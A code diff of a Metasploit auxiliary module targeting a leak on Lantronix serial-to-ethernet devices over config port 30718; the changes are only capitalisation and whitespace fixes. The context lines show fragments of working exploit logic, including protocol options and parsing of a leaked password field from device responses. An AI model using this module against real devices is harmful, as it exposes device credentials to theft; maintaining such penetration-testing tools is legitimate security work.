@@ -13,9 +13,9 @@ class Metasploit4 < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Lantronix leak exploitation` via 77feh',
+      'Name'        => 'Lantronix Leak exploitation` via 77feh',
       'Description' => %q{
-          This module exploits leak exploitation through RCR record on serial-to-ethernet
+          This module exploits Leak exploitation through RCR record on serial-to-ethernet
         devices via the config port (30718/udp/tcp, enabled by default).
       },
       'Author'      => 'kost',
@@ -26,7 +26,7 @@ class Metasploit4 < Msf::Auxiliary
       [
         Opt::CHOST,
         Opt::RPORT(30718),
-	OptString.new('IPPROTO', [ true, "What IP protocol to use (tcp/udp)", 'udp' ]),
+        OptString.new('IPPROTO', [ true, "What IP protocol to use (tcp/udp)", 'udp' ]),
         OptInt.new('COUNT', [ true,  'Number of times to perform dump', 1]),
         OptInt.new('SLEEP', [ true,  'Sleep for how many seconds between requests', 0])
       ], self.class)
@@ -63,7 +63,7 @@ class Metasploit4 < Msf::Auxiliary
 
         if res and res.length > 18 and res[0,4] == "\x00\x00\x00\xF5"
             # vprint_status("#{rhost} - Got packet with expected size.")
-            simplepass = res[12,4] 
+            simplepass = res[12,4]
             if simplepass == "\x00\x00\x00\x00"
               print_status("#{rhost} - Leak: disabled.")
             else
